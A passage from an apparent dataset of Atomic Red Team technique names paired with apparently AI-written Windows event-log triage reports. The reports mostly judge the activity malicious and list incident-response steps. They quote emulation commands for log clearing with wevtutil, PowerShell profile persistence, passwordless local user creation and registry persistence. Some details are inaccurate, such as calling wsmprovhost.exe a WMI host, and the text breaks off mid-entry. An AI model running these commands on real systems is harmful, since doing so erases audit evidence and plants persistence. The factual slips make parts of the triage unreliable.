   - Conduct a post-incident review to analyze what controls failed and improve the security posture.

These steps will help ensure that the system can return to a secure operational state and reduce the risk of similar incidents in the future."
New shim database files created in the default shim database directory,"Upon analyzing the provided logs, several key events and indicators related to potential malicious activity are identified. Here is a detailed analysis:

1. **PowerShell Usage:** The PowerShell logs suggest the execution of a script that involves copying an SDB (Shim Database) file using the `Copy-Item` command. The script attempts to copy items from a path associated with `AtomicRedTeam`, which is often used for security testing and emulating adversaries. The use of such scripts without prior authorization could indicate suspicious activity.

2. **Sysmon Logs:** Multiple Sysmon events show the execution of PowerShell and other command-line tools under a high integrity context running various tasks like checking the system (`whoami`, `hostname`) and clearing event logs through `wevtutil` commands targeting multiple log channels: Sysmon, Application, System, Security, and Windows PowerShell. This series of actions follows a common pattern indicative of log tampering often seen in malicious activities where an attacker attempts to cover their tracks.

3. **Log Clearing Events:** 
   - **Security Log Clearing:** Event ID 1102 from the Security log indicates that the Security log was cleared by the user `admin_test`. This is a significant indicator of malicious activity as attackers often clear logs to hide their footprint.
   - **System and Application Log Clearing:** Events show that the System and Windows PowerShell logs were also cleared by `admin_test`, strengthening the indication of an attempt to obstruct forensic analysis.

4. **Uncommon Use of `wevtutil`:** The command-line logs showing `wevtutil` usage to clear logs and export events to temporary locations (perhaps before clearing) is highly suspect and further suggests malicious intent.

5. **Integrity Level & User Context:** Many actions are performed under high integrity levels and system context, indicating that privileged access was gained or is being misused.

6. **Edge Installer Activity:** While the edge installer activities seem routine, occurring alongside other suspicious activities, they don’t directly contribute to the primary malicious pattern observed.

### Conclusion:
The combination of PowerShell activity mimicking adversary emulation scenarios, unauthorized and suspicious event log clearing, and actions to verify system information with high permissions strongly suggests a compromise has occurred, traditionally associated with sophisticated attacks aiming at maintaining stealth and persistence.

### Resolution:
- **MALICIOUS:** The logs contain clear indicators of malicious activity due to unauthorized PowerShell execution, event log clearing, and the overall pattern of behavior compatible with covering tracks after possible unauthorized access or system reconnaissance.

### Recommended Actions:
- Conduct a thorough investigation of `SERVER002`. Check for any unauthorized access, particularly focusing on how `admin_test` user account or any other account was used to carry out these activities.
- Isolate the machine from the network to prevent further unauthorized actions.
- Retrieve and preserve any disk images for forensic analysis.
- Change credentials for any accounts that were active during the timeframe and implement monitoring for similar actions across the network.
- Consider a full incident response engagement with a professional team to understand the scope of possible compromise and remediate.

Load custom DLL on mstsc execution,"**Analysis of Windows Event Logs:**

1. **Log File Clearing Events:**
   - System logs (EventID: 104) show that logs for System and Windows PowerShell channels were cleared.
   - A Security log (EventID: 1102) also indicates a log clearing event. 
   - The logs were cleared by the user ""admin_test"" on ""SERVER002"". The process responsible for these operations is ""wevtutil.exe"", commonly used for managing event logs, including clearing them.

2. **Suspicious Command Execution:**
   - The Sysmon logs show ""cmd.exe"" executing ""reg add"" command to modify the Windows Registry, specifically to add a potentially suspicious registry key (`HKLM\SOFTWARE\Microsoft\Terminal Server Client`). This key modification is often associated with persistence mechanisms.
   - The process ""cmd.exe"" was initiated by ""admin_test"" using a high integrity level, which may indicate elevated privileges.

3. **Process Execution:**
   - Multiple instances of ""wevtutil.exe"" are being executed to clear multiple logs (Sysmon, Application, Security).
   - These operations and the context (elevated user, event log clearing) are common tactics used to cover tracks post-compromise.

4. **Unusual Process Parentage:**
   - ""cmd.exe"" is shown executing from a temporary directory, which is unusual for a system command. This can indicate a script or a dropper found its way to execution.
   - The parent process for many of these executions is ""wsmprovhost.exe"", typically involved in Windows Management Instrumentation (WMI) tasks, but should be monitored, especially if it is spawning unusual processes like ""cmd.exe"" from temp directories.

5. **Time Change Events:**
   - EventID 4616 indicates a time change on the system, which can be a legitimate activity but can also be manipulated by attackers to alter timestamps and cover their tracks.

6. **Microsoft Edge Update Activity:**
   - Numerous events relate to ""MicrosoftEdgeUpdate.exe"", showing typical update operations. The context and the presence of regular update paths and Microsoft signatures suggest these activities are legitimate.

**Assessment:**

- **Malicious Activity Indicators:**
  - The combination of log clearing by an elevated user, registry modifications, and the use of administrative tools like ""cmd.exe"" initiated from unexpected locations point towards steps typically taken by adversaries to maintain persistence and hide their footprint.

- **Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Incident Response:**
   - Isolate the affected system to prevent further potential spread within the network.
   - Halt any unauthorized ""wevtutil.exe"" processes.

2. **Forensic Analysis:**
   - Conduct a full forensic investigation on ""SERVER002"", focusing on the admin_test account activity, especially around the log times, to identify the intrusion's source and extent.
   - Analyze network traffic for unusual connections from this host around the time of these events.

3. **Containment and Remediation:**
   - Reset credentials for any accounts that may have been compromised, particularly ""admin_test"".
   - Remove any unauthorized registry modifications and scheduled tasks or scripts introduced as a part of this activity.

4. **Strengthening Security Measures:**
   - Implement enhanced monitoring for process creation, especially for ""cmd.exe"" and log modification tools like ""wevtutil.exe"".
   - Increase visibility on critical system events, such as time changes and registry key modifications.
   
By systematically executing these steps, the integrity of the environment and mitigation of future risks can be ensured."
Bitsadmin Download (PowerShell),"Upon analyzing the provided logs, several activities stand out as potentially suspicious:

1. **Log File Clearing**:
   - In the Security log, there is an entry with Event ID 1102 indicating that the Security event logs were cleared by an account named `admin_test`. This action is typically considered highly suspicious, as clearing logs is often done to hide malicious activity.

2. **PowerShell Script Execution**:
   - In the Windows PowerShell log, there are multiple instances of a PowerShell command execution involving `Start-BitsTransfer` to download a file from a URL (https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md) to a local path. This pattern of behavior is a common indicator of potential malicious activity, particularly when executing PowerShell scripts from remote sources.

3. **Use of `wevtutil`**:
   - The Sysmon logs show `wevtutil.exe` being executed with the `cl` (clear logs) command on different channels (Application, System, Security, and Windows PowerShell) by the `admin_test` user account. This aligns with the Security log clearing event and could be part of an effort to conceal actions.

4. **Suspicious Process Chains**:
   - Numerous processes were executed under high integrity levels, such as commands via `powershell.exe` and `wevtutil.exe`, which indicates potential unauthorized administrative control.

5. **Network Activity**:
   - There are several entries around EdgeUpdate processes and network activity, which appear normal for an update process. However, the focus should remain on the unauthorized potential use of PowerShell and log clearing activities.

Based on these observations, this activity should be categorized as MALICIOUS due to:

- Log clearing activity conducted by a potentially unauthorized user or script.
- PowerShell script execution downloading files from external sources, which is often indicative of command and control activity or lateral movement attempts.
- The alignment of these actions suggests a coordinated attempt to maintain stealth and persistence in the network environment.

**Recommendations**:
- Perform immediate containment and isolation of the `Server002` machine until a full investigation can be conducted.
- Review user account `admin_test` for any unauthorized privilege escalations or access anomalies.
- Investigate the downloaded content from the PowerShell command and its intended execution or deployment.
- Conduct a full forensic analysis to collect and preserve evidence and identify potential attackers’ traces.
- Strengthen monitoring and alerting mechanisms for suspicious PowerShell activities and log manipulation attempts."
Install AppInit Shim,"Upon review and analysis of the Windows event logs provided, the following observations and conclusions are drawn:

### Analysis:
1. **Event Log Clearing**: 
   - **Security Log Clear (Event ID 1102)** and **Sysmon Log Clear** was logged at the same timestamp, indicating an attempt to cover tracks. 
   - **System Log Clearing (Event ID 104)** was similarly executed shortly thereafter.
   - An admin account `""admin_test""` is involved in these operations, which is suggestive of an insider threat or compromised account since such actions are typically executed to hide tracks of malicious activity.

2. **PowerShell and Wevtutil Activity**:
   - The presence of PowerShell execution (`powershell.exe`) followed immediately by `wevtutil.exe` commands to clear logs is highly indicative of malicious activity. Wevtutil clearing logs is often used to hide traces of compromise.
   - The rapid sequence and nature of commands, especially  `wevtutil.exe cl` commands clearing multiple event logs, is highly suspicious.

3. **Process Executions and Privilege Escalation**:
   - Events showing privilege assignment events (`Event ID 4672`) for the SYSTEM account which is typical but could indicate exploitation attempts when correlated with the context of other events.
   - Suspicious registry modification via `reg.exe` through `cmd.exe`, as evidenced by the command `reg.exe import`, suggests registry-based persistence mechanisms, indicative of malware trying to survive reboots.

4. **Credential Access Activity**:
   - Multiple `Event ID 5379` entries attempting credential operations with `MicrosoftAccount:user=02txoixylodcstop`, failed with `ReturnCode=3221226021`, possibly indicating unwanted access or a misconfigured service.

5. **Edge Update Activity**:
   - A significant number of activities related to Microsoft Edge Update processes are seen. While this can often be benign, the number and sequence of operations in the context of other events might be worth verifying against update schedules.

6. **Windows Powershell Import**:
   - The involvement of Atomic Red Team path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1546.010\\src\\T1546.010.reg`, is often indicative of a known test for lateral movement/defense evasion, mimicking or replicating ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) tactics.

### Assessment:
Based on the sequence of events and types of activities observed, there are multiple strong indicators of compromise. The combination of log clearing activities, obscure processes under an admin user, potential use of legitimate tools like PowerShell and wevtutil in a manner aligned with typical attack scenarios point towards illicit activity.

### Resolution:
**MALICIOUS**: The actions recorded in these logs display clear signs of malicious activity, demonstrating intentions to evade detection and cover tracks. Immediate steps should be taken to isolate the affected system, perform a thorough forensic investigation, and remediate any identified threats. It is also advisable to review user account activity and reinforce security measures, including increased logging and monitoring for unusual use of administrative tools and accounts."
Persistent Code Execution Via Excel Add-in File (XLL),"Upon thorough analysis of the provided Windows event logs, several key patterns and activities stand out. Let's break down the events to identify any suspicious or malicious activities:

### Windows PowerShell Logs:
- **PowerShell Script Execution:** The logs show PowerShell being used to create a COM Object for Excel and modify the Excel options in the registry. The script checks if Excel is 64-bit or 32-bit and then copies an `.xll` file (notepad.xll) to the add-ins directory. This script modifies the registry key to load the `.xll` file whenever Excel starts, which is a classic technique for persistence or running malicious code using Excel.
  
  - **Indicators:**
    - Script attempts to copy an `.xll` file to the user's Excel add-ins directory.
    - Modifies registry settings related to Excel's options to ensure the `.xll` is loaded.
    
This behavior is often associated with macro malware and is a common tactic in cyberattacks to maintain persistence or execute code through a commonly used application like Excel.

### Security Logs:
- **Event Log Clearance:** Multiple instances, particularly Security, System, and PowerShell logs being cleared (`wevtutil` command usage). This action is usually a strong indicator of an attempt to cover tracks by an attacker post-malicious activity.

  - **Indicators:**
    - Logs being cleared shortly after the suspicious PowerShell activity.
    - Usage of `wevtutil` by an administrative user (`admin_test`).

### Sysmon and System Logs:
- **Suspicious Process Activity:** 
  - The `wevtutil` tool was executed multiple times to clear various logs, which is generally suspicious, especially following a PowerShell script modifying system settings.
  - The process execution involves critical host components (`wevtutil.exe`, `conhost.exe`) related to command-line utilities performing operational tasks.

### Assessment:
The combination of PowerShell script execution for modifying registry keys and clearing of event logs immediately after suggests a high likelihood of malicious activity. The PowerShell script tactic aligns with known attack methodologies aimed at persistence and evasion. Furthermore, the clearing of event logs indicates a deliberate attempt to hide these actions, which is a typical post-exploitation activity.

### Resolution:
- **MALICIOUS.** The activities logged are consistent with typical malicious behaviors, such as unauthorized registry modifications to achieve persistence and the subsequent clearing of event logs to conceal these actions. Immediate action is required to mitigate any further risks.

### Recommended Actions:
1. **Immediate Isolation:** Disconnect the affected system (Server002) from the network to prevent any potential lateral movement or command-and-control operations.
2. **Forensic Analysis:** Conduct a full forensic analysis of the system to determine the extent of compromise, including analyzing any dropped files, scripts, or further registry modifications.
3. **Review Recent Changes:** Check for any recent changes in user accounts, privileges, and installed programs.
4. **Enhanced Monitoring:** Increase monitoring on all critical systems, especially focusing on similar PowerShell command patterns and event log clearing activities.
5. **Educate Users:** Brief relevant personnel on this incident, emphasizing vigilance and reporting any anomalies or phishing attempts.
6. **Patch and Update:** Ensure all systems and applications are fully patched and updated to mitigate exploitation from similar vectors."

### Analysis Summary
1. **Process Execution Events:**
   - **Event ID 1:** Several executions of `wevtutil.exe` with the `cl` (clear) command, executed by the `SERVER002\admin_test` user. This tool is used to manage event logs, and the specific `cl` command is used to clear event logs, which can be indicative of attempt to cover tracks.
   - **`cmd.exe` Execution:** Execution of `cmd.exe` with a command to create a user account ""ANONYMOUS LOGON"" with a suspicious password. The command line adds a new user in a domain environment, which is a strong indicator of potentially unauthorized activity.

2. **Log Clearing Events:**
   - **Security Log (Event ID 1102):** Indicates the clearing of logs by `admin_test`. This could be an attempt to obscure evidence of malicious activity.
   - **System Log:** Similarly, clearing of the System log was recorded, which again can suggest an attempt to hide operations on the system.

3. **Time Change:**
   - Events indicating time change on the system (Event ID 4616 in Security log and Kernel-General logs) could be used as a tactic to mislead or confuse investigations, assuming a manipulation of system time.

4. **High Integrity Level and System Processes Run by a User Account:**
   - Many of these processes, especially `cmd.exe`, `net.exe`, and `wevtutil.exe`, are executing at a high integrity level which indicates they were run with elevated privileges under `SERVER002\admin_test`.

5. **Use of Common Administrative Tools:**
   - The execution of `whoami.exe`, `net.exe`, and other administrative tools by `admin_test`. These can be benign in legitimate admin operations but, coupled with the context, it suggests potential misuse by an attacker.

### Conclusion
The actions captured in these logs strongly suggest malicious intent due to the use of `wevtutil.exe` to clear logs, the creation of potentially unauthorized users, and elevation of privileges, combined with the execution of commands and administrative tools indicative of an attack sequence. 

**Resolution: MALICIOUS**

### Recommendations
- **Immediate:** Disable and isolate the affected account (`admin_test`) to prevent further misuse.
- **Investigate:** Conduct a full forensic investigation of the system to determine the enterprise-wide impact and to check for other compromised systems.
- **Review:** Security monitoring and alerting rule configurations to detect similar actions across other endpoints.

Install MS Exchange Transport Agent Persistence,"Upon reviewing the provided event logs, several flags indicate potentially malicious activities involving the user `admin_test` on the computer `Server002`. Let's analyze these events step by step:

### Analysis:

1. **Event Log Clearing**: 
   - Security log entry with Event ID 1102 and System log entries with Event ID 104 indicate that the logs for the Security, System, and Windows PowerShell channels were cleared (`wevtutil.exe` was used to clear these logs).
   - Clearing event logs is a known tactic used by attackers to cover tracks after performing unauthorized actions. This action in itself could be considered suspicious or malicious, especially when executed with high privileges, as indicated by the user `admin_test`.

2. **Privilege Escalation**:
   - Event ID 4672 in the Security logs shows that `admin_test` was granted a series of elevated privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege`, which are sensitive and potentially dangerous if misused.
   - While this may be legitimate for an admin account, in context with other logs, these privileges can enable unauthorized activities like the ones executed here (e.g., log clearing).

3. **Use of PowerShell**:
   - Windows PowerShell log shows suspicious usage with commands involving `Install-TransportAgent`, which could potentially be used to install malware or backdoors via manipulated transport agents.
   - The PowerShell command provided resembles attempting to manipulate or add a transport agent, often a technique used in Exchange Server environments for email interception, data exfiltration, or spreading malware.

4. **System and Security Log Manipulation**:
   - `wevtutil.exe` was used multiple times to clear logs (Security, System, and Windows PowerShell), which is highly indicative of attempted cover-up actions post-compromise.
   - The correlated SystemTime for these actions fits closely, suggesting a coordinated effort to erase traces of earlier activities potentially executed by exploiting elevated privileges.

### Final Assessment:
Collectively, these behaviors (log clearing, privileged process execution, PowerShell script invocation for potentially installing transport agents, and use of suspicious commands) are highly indicative of malicious activity. Most of these actions do not align with regular administrative operations due to their covert nature and the need for log obfuscation.

**Resolution**: **MALICIOUS**
- The activities in the logs are consistent with tactics, techniques, and procedures (TTPs) of malicious actors attempting to maintain persistence, hide traces, and potentially deploy malicious payloads.

### Recommendations:
- **Immediate Actions**: 
  - Isolate `Server002` from the network to prevent potential lateral movement.
  - Initiate a full forensic investigation on the host to understand the extent of the breach.
  - Reset credentials for `admin_test` and all potentially affected accounts.
  - Review and tighten the security policies around the use of privileged accounts and administrative tools like PowerShell and `wevtutil`.
  
- **Long-term Measures**:
  - Implement enhanced logging and monitoring solutions that can detect such actions in real-time.
  - Educate the administrative staff on secure usage practices and awareness of operational security.
  - Consider deploying threat detection mechanisms that focus on identifying uncommon but potentially harmful administrative actions."

Windows MOFComp.exe Load MOF File,"Based on a thorough review of the provided Windows event logs, several activities appear suspicious and indicative of potential malicious activity. Here's a summary of the findings:

1. **Use of `wevtutil.exe` for Clearing Logs**:
   - Multiple instances of the `wevtutil.exe` being executed with the `cl` (clear log) command on various system logs (Microsoft-Windows-Sysmon/Operational, Application, Security, System, and Windows PowerShell). This behavior suggests an attempt to cover tracks by clearing logs, a common tactic used by threat actors to hide malicious activities.

2. **Suspicious PowerShell Execution**:
   - A PowerShell script is executed with the intent to run `mofcomp.exe`, which compiles Managed Object Format (MOF) files. The specific MOF file is located in a suspicious temporary directory related to ""AtomicRedTeam,"" a known repository for security testing tools and tactics. The combination of using PowerShell with MOF files—especially from a path associated with testing tools—could represent an attempt to alter the system for persistence or other malicious purposes.

3. **Anomalies in Process Creation**:
   - The appearance of processes such as `whoami.exe` and `hostname.exe` that could be used for reconnaissance. While these are legitimate utilities, their execution might indicate an attacker validating their access level or simply gathering information.

4. **Windows Management Instrumentation (WMI) Event**:
   - A WMI error event was logged with an error 0x80041010, following an execution indicating a query that monitors the creation of processes like `notepad.exe`. This could imply the presence of some monitoring or automated script using WMI to act on specific conditions, which may be suspicious when correlated with other non-standard activities.

5. **Event Log Clears**:
   - The logs indicate that the log files for ""Security,"" ""System,"" and ""PowerShell"" were cleared by the user `admin_test`. This coincides with the execution of the `wevtutil.exe` mentioned earlier.

**Assessment and Resolution**:
- The combination of using `wevtutil.exe` to clear logs, execution of potentially malicious PowerShell scripts, and suspicious use of common Windows utilities indicates a level of sophistication and potentially malicious intent. Additionally, the involvement of a temp directory named ""AtomicRedTeam"" suggests possible use of penetration testing frameworks in an offensive manner without authorization.

Given the observations and the potential risk they represent, the appropriate resolution is:

**MALICIOUS**

**Guidance on How to Proceed**:
1. **Isolate the Affected Machine**: Immediately isolate the machine from the network to prevent further spread or damage.
2. **Conduct Full Forensic Analysis**: Perform a comprehensive forensic investigation on the affected system to understand the scope and impact of the compromise.
3. **Alert Relevant Teams**: Inform Incident Response and IT Security teams to ensure prompt containment and remediation.
4. **Review Access Logs & Permissions**: Check user privileges and access logs for `admin_test` and other related accounts for any unauthorized actions.
5. **Look for Indicators of Compromise (IOCs)**: Search for IOCs across other endpoints to identify if the threat has propagated.
6. **Consider an Incident Post-Mortem**: Once contained, conduct a full review to improve defenses and ensure better detection and response in the future."
Persistent Code Execution Via Word Add-in File (WLL),"**Analysis of Logs:**

The logs provided reveal several unusual and suspicious activities on the system named ""Server002."" Below is a detailed analysis:

### PowerShell Log Analysis:
1. **PowerShell Script Execution**: 
   - A PowerShell script is executed that creates a Word COM object and conditionally copies DLLs (`wordwll_x64.wll` and `wordwll_x86.wll`) into the Word startup folder as `notepad.wll`.
   - This script is typical of techniques used to achieve persistence by loading a malicious DLL when Microsoft Word is started.

2. **Log Source**: 
   - The scripts reference ""AtomicRedTeam,"" a known open-source library for testing detection. Although this could imply legitimate testing, in an enterprise production environment, these activities should be tightly controlled and segregated from general usage.

### System Log Analysis:
1. **Log Clearing Events**:
   - The logs for both the System and Windows PowerShell channels were cleared by the user `admin_test` at the same time as the suspicious PowerShell activity.
   - Clearing logs is typically done to cover tracks post-compromise, indicating potentially malicious intent.

### Sysmon Log Analysis:
1. **Process Creation and Execution**: 
   - Numerous process executions are logged demonstrating PowerShell, `wevtutil` (used to clear logs), and other utilities like `whoami`, which are used to gather information about the user context.
   - `wevtutil.exe` is specifically shown to clear logs in the Sysmon channel and is attributed to the user `admin_test`.

2. **Microsoft Edge Update**: 
   - The logs contain executions involving Microsoft Edge Update processes (`MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`), but these activities seem to be consistent with software updates and service checks, thus appearing benign.

### Security Log Analysis:
1. **Security Log Clearing**:
   - User `admin_test` also cleared Security event logs, which corresponds in time with Sysmon log clearances and suspicious PowerShell activity.

### Application Log Analysis:
1. **Software Protection Platform**:
   - Regular entries related to system protection services, but no direct correlation was found to indicate an immediate threat.

### Threat Assessment:
- The PowerShell script involving Office startup items and the simultaneous clearing of event logs by `admin_test` are particularly suspicious activities and align with behaviors associated with persistence mechanisms used by attackers.
- The event log clearance is a significant indicator that actions were taken to cover malicious tracks.

### Final Resolution:
**MALICIOUS** - The logs contain indicators of malicious activity involving persistence mechanisms (via PowerShell) and log clearings, which are consistent with evasion techniques. Immediate action is necessary.

### Guidance:
1. **Containment and Remediation**:
   - Isolate the affected system (""Server002"") from the network to prevent further spread or communication with command and control servers.
   - Conduct a forensic investigation to determine the full scope of compromise and remove any malicious components.
   - Reset credentials, particularly for `admin_test`, and review user permissions and access logs for unauthorized actions.

2. **Enhancement of Security Posture**:
   - Implement strict controls and monitoring on the use of PowerShell and administrative tools.
   - Regularly audit and monitor for the usage of potential attack vectors like DLL side-loading or unauthorized script execution.
   - Establish enhanced logging and alerting mechanisms to detect log-clearing or suspicious command executions.

3. **User Education and Awareness**:
   - Conduct training sessions to educate users about indicators of compromise and safe practices for script usage.
   - Implement policies for the controlled use of testing frameworks like AtomicRedTeam to ensure they do not interfere with production environments."
Web Shell Written to Disk,"Upon analysis of the provided Windows event logs, there are several indicators of suspicious activity that warrant further investigation:

### Anomalies and Identification of Potential Malicious Activities:

1. **Clearing of Event Logs:**
   - In the System log, Event ID 104 indicates that event logs have been cleared for the System and Windows PowerShell channels. 
   - Similarly, in the Security log, Event ID 1102 shows that logs were cleared on the Security channel by the user `admin_test`.
   - Clearing event logs is a commonly known behavior of actors attempting to cover their tracks after performing illicit activities. The execution of the `wevtutil.exe` tool to clear logs can be particularly indicative of malicious intent.

2. **Unusual Process Execution:**
   - The Sysmon logs indicate multiple executions of `wevtutil.exe` with the command to clear logs (`cl` command). This is suspect in a scenario involving potential log tampering.
   - There are repeated instances of administrative tools such as `hostname.exe`, `whoami.exe`, and `cmd.exe` running with elevated integrity levels. Although not inherently malicious by themselves, in conjunction with other activities, these can indicate reconnaissance or privilege exploration.

3. **Potential Web Shell Deployment:**
   - An `xcopy` command in the Sysmon logs reflects copying files from a temporary directory to the `C:\inetpub\wwwroot` directory, which is commonly used as the root for web applications on IIS servers. This could indicate attempts to deploy a malicious script or web shell in a web-accessible directory.

4. **Process Execution in Odd Contexts:**
   - The execution path for PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) running under `admin_test` is not unusual, but when combined with its involvement in the scenarios surrounding log clearance, it raises a flag for further investigation.

5. **Edge Update Processes:**
   - Numerous events related to `MicrosoftEdgeUpdate.exe` processes running as `NT AUTHORITY\SYSTEM`. These might be benign updates; however, the activity should be validated to ensure they align with expected software patching/scheduling tasks.

### Assessment and Conclusion:

- **Resolution:** **SUSPICIOUS**

Given the presence of log clearing events, combined with the execution of `wevtutil.exe` for log maintenance, and the potential deployment of files to web-accessible directories, it suggests potentially malicious activity requiring further investigation. 

### Recommended Actions:

1. **Immediate Actions:**
   - Conduct a thorough forensic examination of the host to understand any modifications to the system and user files.
   - Check for any unauthorized user accounts or modifications in user privileges.
   - Identify and examine suspicious network connections to and from the host.

2. **Containment and Eradication:**
   - Temporarily isolate the affected system from the network to prevent further actions by the potential attacker.
   - Review firewall and network logs to identify any anomalies, potential data exfiltration, or lateral movement.

3. **Recovery and Lessons Learned:**
   - Restore the affected system from a known good backup if malicious activity is confirmed.
   - Implement further monitoring controls and anomaly detection systems to promptly detect such suspicious activities in the future.
   - Educate users on identifying and reporting suspicious activities.

Engage the incident response team immediately to confirm suspicions and implement containment strategies."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"Upon reviewing the Windows event logs provided for the CEO's machine, the following points highlight activity of concern in the logs:

1. **Application Log:**
   - Multiple `APPCRASH` events involving `Sysmon.exe` indicate that the Sysmon process encountered an unexpected termination. The crash code `c0000005` is an access violation error, which could indicate memory corruption or potential exploitation attempts.

2. **System Log:**
   - Logs show that the `System`, `Security`, and `Windows PowerShell` event logs were cleared by the user `admin_test`. This is often indicative of an attempt to cover tracks following suspicious or malicious activities.

3. **Windows PowerShell Log:**
   - A PowerShell session executed suspicious WMI Persistence with script execution. The specific command `$Filter=Set-WmiInstance` with `ActiveScriptEventConsumer` suggests the user was likely trying to establish persistence using WMI on the system, a tactic known to be used by attackers to maintain access.

4. **Sysmon Log:**
   - Numerous instances of `wevtutil.exe` were invoked to clear event logs for `Sysmon`, `Application`, and `System`. These activities were orchestrated in conjunction with the above point, further suggesting intentional log tampering.

5. **Security Log:**
   - The event log clearance by `admin_test` aligns with the cleared logs noted in the System log. The privileges seen in 4672 events include high privileges like `SeDebugPrivilege` and `SeLoadDriverPrivilege`, granting significant access potentially used to tamper with or control system processes.

Given the combination of event log clearing, persistency tactics through PowerShell and WMI abuse, and the crashing of a critical security monitoring component (Sysmon), these activities raise a significant alarm. The behaviors strongly suggest attempts to conceal malicious actions and establish unauthorized persistence.

**Assessment:**
- The logs indicate clear malicious intent, demonstrated by the event log clearing and suspicious commands executed in PowerShell using WMI for persistence.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:** 
   - Isolate the machine from the network to prevent potential lateral movement and data exfiltration.

   - Report findings to appropriate internal response teams and possibly external authorities if data breaches are involved."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"## Detailed Analysis

### Overview
The logs consist of various Windows event logs, including Security, Sysmon, Application, Windows PowerShell, and System logs. These logs provide a comprehensive view of events occurring on `Server002`, particularly focusing on process creation, log clearing, and PowerShell activity. The primary focus was on the CEO's machine where an alert was raised.

### Suspicious or Anomalous Behavior

1. **Clearing of Event Logs**:
   - Multiple logs indicate the clearing of significant logs such as `Security`, `System`, and `Windows PowerShell` channels around the same time. Specifically:
     - **Security Log Cleared**:
       - Security Event ID 1102 indicates that the security event log was cleared by a user (`admin_test`). Clearing security logs is a classic sign of an attempt to hide malicious activity.
     - **System and PowerShell Logs Cleared**:
       - System Event ID 104 shows logs were cleared for the `System` and `Windows PowerShell` channels by the same user (`admin_test`). This reinforces the suspicion that the user might be trying to cover up tracks.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs reveal attempts to copy potentially malicious files, using an obfuscated path related to the Atomic Red Team simulation framework, which is often used for testing red teaming capabilities. 
   - **Command Executed**: 
     - The command involves copying a file named `ExcelVBAaddin.xlam` to the Excel startup folder as `notepad.xlam`, followed by an attempt to execute Excel. This is an indication of a possible attempt to persist or execute code within Excel.
   - Log entries showing failures to execute these scripts imply an attempted action rather than a successfully executed one. 

3. **Frequent Execution of `wevtutil.exe`**:
   - The utility `wevtutil.exe` is commonly used for managing log files and was observed being executed several times with the `cl` (clear) action, which further substantiates the deliberate clearing of logs.

4. **Credential Issues and Process Execution by `admin_test`**:
   - Multiple processes initiated by `admin_test` are executed with `High` integrity level, indicating the use of administrative privileges.
   - Processes related to `TrustedInstaller` and other system updates (`TiWorker.exe`) were observed; however, these seem benign in nature.

5. **Execution of Hostname and Whoami**:
   - These utilities, while usually benign, are sometimes used to gather information about the system and user context within a script or malware.

### Indicators of Malicious Activity

- The combination of event log clearing, suspicious PowerShell command execution, attempts to copy files to sensitive directories, and the utilization of administrative privileges strongly indicate malicious intent or activity designed to simulate attack behavior.
- The presence of Atomic Red Team test scripts further indicates an environment possibly undergoing security testing, though it raises suspicion if unauthorized.

### Assessment

The combination of actions observed in the logs suggest a high risk of malicious activity, or at the least, simulation of such attacks typically used for testing preparedness against certain techniques.

### Guidance

- **Immediate Action Needed**: Investigate the user account `admin_test` for any unauthorized access or activity. 
- **Audit and Review**: Analyze any past activities performed by `admin_test` to understand the timeline and correlate with other events or incidents.
- **Security Policies**: Strengthen or implement stricter policies around administrative privileges, monitoring, and event logging to detect and prevent similar attempts.
- **Incident Response**: If not part of a sanctioned test, this incident should be classified and investigated as a security incident with necessary containment, eradication, and recovery actions.

### Final Resolution

**MALICIOUS**: The logs contain activity consistent with typical malicious behavior, such as clearing event logs to cover tracks, executing potentially harmful PowerShell scripts, and utilizing administrative privileges for various operations. Immediate action is recommended."

Append malicious start-process cmdlet,"Upon reviewing the logs provided, the following suspicious activities stand out:

1. **Creation of Malicious PowerShell Profile**:
   - The PowerShell log indicates a script being written to the PowerShell profile with commands to start the calculator application (`calc.exe`). This is revealed by the log entries where `Add-Content $profile -Value ""Start-Process calc.exe""` appears multiple times. Modifying the PowerShell profile to automatically start an application could indicate an attempt to persist a payload on the system.

2. **Event Log Clearance**:
   - Several logs including System and Security logs are cleared shortly after the suspicious PowerShell activity. Clearing event logs is a known tactic used by attackers to cover their tracks after performing malicious actions, suggesting potential tampering.
   - Security Log Event ID 1102 hints at the clearing of logs by a user with the username ""admin_test"".

3. **Unusual Process Executions**:
   - Multiple instances of `wevtutil.exe` and `whoami.exe` being executed could suggest reconnaissance attempts or log tampering.
   - Execution of `C:\\Windows\\System32\\taskhostw.exe` with the account ""NT AUTHORITY\\SYSTEM"" is normal, but given the context of other activities, requires further investigation.

4. **Elevated Privileges Detected**:
   - Multiple instances of Security logs with Event ID 4672 show special privileges being assigned to the system account, which includes high-level permissions like `SeDebugPrivilege` and `SeTcbPrivilege`. While these can be legitimate, in combination with other suspicious activities, they can indicate privilege escalation attempts.

5. **Sysmon Log Entries**:
   - The execution of `calc.exe` through PowerShell, as detected in the Sysmon log, correlates with previously suspected PowerShell manipulation, suggesting a confirmed execution of the payload.

**Assessment and Guidance**:
- The activities observed in the logs, such as the modification of PowerShell profiles to execute a program, the clearing of event logs, and the use of elevated privileges indicate a likely compromise of the system. The intention appears to be maintaining persistence and covering tracks.
- As the actions align with known attacker behaviors, there are indicators of a malicious breach on the system.

Create a new user in PowerShell,"### Detailed Analysis of the Logs:

#### Suspicious or Anomalous Behavior Identified:

1. **Creation of a New User:**
   - The logs show a command `New-LocalUser -Name ""T1136.001_PowerShell"" -NoPassword` executed via PowerShell on `Server002`. 
   - This action is recorded in multiple event logs, including Windows PowerShell, Sysmon, and Security logs.
   - Event ID 4720 in the Security log indicates a new user account was created with the name `T1136.001_PowerShell`.

2. **Log Clearing and Privilege Activation:**
   - The System logs show entries indicating that event logs (System, Windows PowerShell, and Security) were cleared (Event ID 104).
   - The Security log (Event ID 1102) confirms the security log was cleared.
   - The Event ID 4672 indicates that the user `admin_test` was granted multiple privileges, which could be used for further unauthorized activities, including `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc.

3. **Time Change:**
